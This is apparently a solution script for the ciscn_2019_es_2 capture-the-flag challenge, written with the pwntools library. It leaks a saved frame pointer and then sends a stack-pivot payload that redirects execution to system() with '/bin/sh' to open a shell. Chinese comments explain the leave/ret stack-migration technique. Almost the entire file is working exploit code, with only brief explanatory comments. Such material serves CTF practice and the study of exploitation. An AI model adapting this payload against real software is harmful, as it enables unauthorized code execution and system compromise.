# -*- coding:utf-8 -*-
from pwn import *

io=process("./ciscn_2019_es_2")
gdb.attach(io,'b *0x804862A\n b *0x80485FC')
sys_plt=0x8048400 
 
pl='a'*0x20+'bbbbbbbb'
io.send(pl)
io.recvuntil('b'*8)
ebp=u32(io.recv(4))  #泄露ebp
print(hex(ebp))             #仅仅修改了ebp
pl2=('a'*8+p32(ebp-0x24)+'bbbb'+p32(sys_plt)+'cccc'+p32(ebp-0x1c)+'/bin/sh\x00').ljust(0x28,'p')+p32(ebp-0x2c)

# 第一处 ebp-0x24 是利用汇编代码lea  esp, [ecx-4] 更改esp，这个位置必须指向system_plt的后四个字节
# 第二处 ebp -0x1c  是指向/bin/sh的，作为一个指向字符串的参数。
# 地三处，修改的是ebp ，用于栈迁移，2C刚好是原来栈的大小(包括ebp)，保证迁移回来使用原来的栈
io.send(pl2)
io.interactive()
 #  leave 指令  mov ebp,esp;//将ebp的值赋给esp  ,然后执行 pop ebp 
 #  通过修改ebp，使得程序在第二次执行retn时，跳到我们设定的函数去执行(利用栈传递参数)
 #  将ebp 修改来比以前小 ，当执行leave时 出现ebp比esp 小的情况。
 #  主要还是根据第二个retn之前的一段汇编指令，来进行栈上数据的构造。
